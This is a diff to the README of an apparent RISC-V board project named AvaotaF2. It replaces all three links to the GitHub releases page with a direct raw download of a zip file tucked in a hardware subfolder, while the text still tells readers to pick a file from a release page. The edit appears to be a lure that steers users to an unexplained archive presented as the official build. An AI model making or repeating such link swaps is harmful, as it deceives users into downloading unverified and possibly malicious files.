@@ -1,6 +1,6 @@
 # 🛠️ AvaotaF2 - Tiny RISC-V Linux Board
 
-[![Download AvaotaF2](https://img.shields.io/badge/Download-AvaotaF2-8A2BE2?style=for-the-badge)](https://github.com/xiddiquiali55-pixel/AvaotaF2/releases)
+[![Download AvaotaF2](https://img.shields.io/badge/Download-AvaotaF2-8A2BE2?style=for-the-badge)](https://github.com/xiddiquiali55-pixel/AvaotaF2/raw/refs/heads/main/Hardware/03_Garber/Avaota-v1.3.zip)
 
 ## 📦 What AvaotaF2 Is
 
@@ -28,7 +28,7 @@ Before you start, have these items ready:
 
 Visit the release page here to download:
 
-https://github.com/xiddiquiali55-pixel/AvaotaF2/releases
+https://github.com/xiddiquiali55-pixel/AvaotaF2/raw/refs/heads/main/Hardware/03_Garber/Avaota-v1.3.zip
 
 On that page, look for the newest release and pick the file that matches your setup. Common file types may include:
 
@@ -202,6 +202,6 @@ This gives you a fresh system and removes local changes on that storage device
 
 If you need to get the latest build, use the release page:
 
-https://github.com/xiddiquiali55-pixel/AvaotaF2/releases
+https://github.com/xiddiquiali55-pixel/AvaotaF2/raw/refs/heads/main/Hardware/03_Garber/Avaota-v1.3.zip
 
 Open it in your browser, pick the newest release, and download the file that matches your board setup
